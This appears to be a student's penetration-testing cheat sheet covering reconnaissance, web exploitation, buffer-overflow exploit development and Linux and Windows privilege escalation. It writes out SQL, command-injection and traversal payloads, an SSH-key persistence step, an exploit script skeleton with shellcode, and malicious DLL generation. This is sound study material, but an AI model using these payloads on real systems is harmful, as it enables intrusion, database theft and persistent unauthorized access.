In [ ]:
Recon:
1) If I get an IP or network:
	- If it's 10.50... skip to next step
	- Otherwise, ping sweep ***from target space***/box where I found the IP against the /24
2) Now that I found live IPs:
	- Scan for open ports (through dynamic tunnel from your ops box!!!!!!!!!!!!!!!!!!!!!!!!!!)
3) Now that I have open ports:
	- bannergrab / nmap -sV version scan to identify specific software/services
4) Run additional enumeration scripts as needed to further interrogate services
	- smb os discovery
	- http enum
	- etc 

Dealing with services:

SMB
	- run smb-os-enum
ftp
	- wget -r (you can provided creds--if you have them--to get more info)
	- actually look at what I download
http
	- wget -r (be aware, not an active website. No interaction = no web exploitation!!!)
	- check for robots.txt and open everything in it, even if, nay especially if, it says denied
	- Click things, open all links in new tabs so we don't forget to check them (ctrl + f for href in source)
	- run my http-enum scan script and open all pages and directories found
	- view page source and developer tools (f12) to see if there are scripts or if it runs GET or POST, etc
ssh or rdp:
	- If I have creds or keys, log in
	- If I don't, make note. Maybe I will later

Web exploitation:
Look for input boxes and dropdowns and interactive elements and javascript and phps
If you find a box you can type in:
	- cmd injection [; whoami ]
	- attempt sql injection [ tom' or 1='1 ]
	- directory traversal [ ../../../../../../../../etc/passwd OR /etc/hosts ]
	- XSS --- this is not a XSS class. Just use/modify your cookie stealer stuff. -usually on trouble tickets, message boards, chat logs, etc

If I mess around with a box/button/dropdown and the url contains "...php?variable=XXX'
	- same as above but in the url bar
	- also sql is a little less concerned with including the ' if the varliable value is a number rather than a text string (i.e. "option=1 OR 1=1" or "option=cars' OR 1='1") because numbers don't usually require quotation marks

If I find a place I can upload:
	- can I access the directory it uploads to? If I can't, then uploading it does me no good
	- will it let me upload a malicious file? Like a script or the cmd injection thing from the fg

If my sql injection works and I get different results (either something breaks or it shows everything):
	- tom' OR 1='1 - tries to display everything in that table.
	- for login pages: tom' OR 1='1 for username and password
		- POST (box) method: tends to log you in as the first entry it finds
		- GET (url) method: dumps the login table (except first entry)
	- Dump that whole database!
		1) identify vulnerable field using OR 1=1
		2) identify # of columns: option=1 UNION SELECT 1,2,3... until we get results
			- We need to know how many columns it needs and where the data will appear
		3) GOLDEN STATEMENT: option' UNION SELECT table_schema,table_name,column_name[,plus extra columns as needed] FROM information_schema.columns; #
		4) duplicate tab so I don't have to do this again. Keep this open as a reference
		5) look for user generated tables 
		6) profit with UNION SELECT [column1],[column2],[column3]... FROM [database].[table]

If I have cmd injection:
	1) whoami to know which account is running website
	2) check /etc/passwd to see if website user has a login shell and what their home directory is (it may not be in /home)
	3) ensure they have a .ssh directory in their home directory (if not, make it!)
	4) echo [id_rsa.pub] >> [home]/.ssh/authorized_keys
	5) profit (by ssh'ing in)


Binary Analysis and Explotation Development
A Wild Binary Appears!
1) Static Analysis:
	- cffexplorer: file type, hashes, strings, headers, dlls imported, is it packed?
2) Behavioral Analysis:
	- set up sandbox (hahahaha), run procmon/fakenet (if you have it, hahahaha!), take snapshots (hahahahahaha!)
	- run it, play around with it, take notes on what happens (for our purposes, it's mostly just this)
	- stop it, check our sandbox and snapshots and other things to see what changed (hahahahaha)
2) Dynamic Analysis:
	- For our purposes, this is behavioral analysis but we're using debuggers as well. (hahahahahahaha!) We don't have that kind of time or money
4) Disassembly:
	- Open in Ghidra and say yes to everythings it asks when we import the file
	- Search For Strings that we found during static and behavioral analysis to find our main function
	- Start at the beginning (with the first strings we found when we ran it) and work your way forward to figure out what it does
	OR
	- start at the END from the result we wish to get and work backward to get the results we want
	- rename functions and variables to make it easier to keep up with what is happening
5) Patching:
	- right click on the assembly code you wish to change and change it.
	- then export program as PE or ELF, depending on what it was when we started
	- profit

Exploit Development:
A Wild Vulnerable Binary Appears!
1) load the binary in gdb and run it
2) crash it with a segmentation fault by generating a REALLY LONG string from the wiremask pattern generator site.
3) Copy the value from the eip field into wiremask to determine our OFFSET to get us to our EIP
4) verify by running binary with our script, sending:
	offset="a" * [whatever our offset was]
	eip="BBBB"		
	send (offset+eip)
   EIP should be four B's. If not, offset is wrong
5) open binary in gdb but without peda (env gdb binary) and unset COLUMNS and LINES
6) Do step 4 again and then run info proc map after crashing it
7) find jmp esp values to use for our EIP with 
	find /b [first address after HEAP], [last address before STACK], 0xff, oxe4
   copy down 3-5 of the resulting memory addresses in case one doesn't work
8) generate shellcode in msfconsole/msfvenom (payload = linux/x86/execute or something like that)
9) send it! 
	- As cmd line argument: binary $(python script.py)
	- As in binary prompt for input: binary <<< $(python script.py)

	#/usr/bin/python
	offset = 'A' * [offset value]
	eip = 0x78563412 (gotta put it in backwards, so 12 34 56 78 becomes 78 56 34 12)
	nop = 0x90 * 10 #for good measure/safety
	[paste shellcode here]
	sending syntax (offset + eip + nop + buf)	
10) profit

A Remote Buffer Overflow Vulnerability exists!
1) identify port 9999 (or whatever) is actually vulnserver/secureserver
2-7) ain't nobody got time for that...
8) open a listener on your linops
9) change the IP/port in our script we already have
10) profit


POST EXPLOITATION SITUATIONAL AWARENESS AND PRIVILEGE ESCALATION:
LINUX

Users and groups:
	cat /etc/passwd (and shadow, if you're a cool kid with privs)
	cat /etc/group	
	ls -la /home
	ls -la ~
	whoami
	hostname

Network Information:
	cat /etc/hosts
	ss -nltp 	(will show listeners)
	ss -auntp 	(will show all the things including established connections)
	ip a 		(show network interfaces and addresses)
	ip n		(new version of arp -a)
	ip r		(shows the routing table)

Running Processes and services:
	ps -elfH	(show processes)
	systemctl list-units --type service OR service --status-all
	ls -la /etc and check configs as needed

Check Logging:
	check for syslog/rsyslog and read config file if it's running
	ls -latr /var/log to see what logs updated since we arrived
	If we see any strange specific sorts of logs, check /etc/ for configs for whatever is logging
	Timestamps are useful for identifying all logs associated with an event, not just ones with a specific username or IP

Scheduled Tasks:
	cat /etc/crontab
	check /etc/cron* (cron.d, cron.daily, cron.monthyly... etc)
	check /var/spool/cron 
	Can I write to any of the above files or directories? Are there any jobs I can take advantage of?Are there any jobs I need to be concerned about?

Files of interest:
	find / -type [f for file or d for directory] -iname "what you're looking for"
	check /tmp and /var/tmp
	check /usr/share
	check /root (if I have privs)
	Did we find any sshkeys, network maps, password files, etc?
	look for temp files (.swp, etc)
	find folders and files you can write to (bonus if they are in cron):
		find / -type f -writable -o -type d -writable 2>/dev/null

Priv Esc:
	sudo -l
	suid and sgid: find / -type f -perm /6000 -ls 2>/dev/null
	check gtfobins for anything I find that isn't on my linops
	sshkey masquerading (steal and use existing keys or upload our public key to the user's directory)
	looking for cronjobs that execute as root that we can write to (scripts, directories, etc) or binaries we can overwrite
	
users with . in their path (if we know something they will run, can we put a script with the same name in a directory where we know they will run it?)

	writeable files and directories: find / -type f -writable -o -type d -writable 2>/dev/null
	
WINDOWS:
Users and groups:
	net user		to see all users
	net user [username] 	to learn about specific users
	net localgroup
	net localgroup [name]	to learn about a specific group
	query user		see who is logged in
	whoami

Network Information:
	netstat /ano (add b if with have privs)
	ipconfig /all
	arp -a
	route print
	net view

Running Processes and services:
	tasklist /v OR task manager (GUI)
	net start or tasklist /svc OR services manager (gui)

Check Logging:
	wevtutil el 		shows all logs
	wevtutil qe [logname] /c:[# of entries] /rd:true /f:text
	wevtutil qe [logname] /c:[#ofentries] /rd:false /f:text /q:"*[System[(EventID=### or EventID=###)]]"
	event viewer (gui)

Scheduled Tasks:
	schtasks /v 		(user created stuff is probably up front)
	task scheduler (gui)

Files of interest:
	check my user's docs
	check public documents
	check admin's docs if you can
	check c:\users
	check c:\windows\temp
	check registry keys ([HKLM|HKCU]\Software\Microsoft\Windows\CurrentVersion\[Run|RunOnce])

Priv Esc:
	dll hijacking/understand dll search order

	procmon to identify missing dll's and msfvenom to generate malicious dlls

	did netstat show vulnserver or some other thing we can use our buffer overflow on

	find user-created services (if it has no description, probably user-created) that we can write to

	check schtasks/task scheduler for jobs running out of files/directories we have write permissions on

	REMINDER: schtasks execute when they're told to, but services will require a restart

	Look for unquoted paths (c:\Program Files\A Directory\file will first try to execute C:\Program Files\A.exe)

	
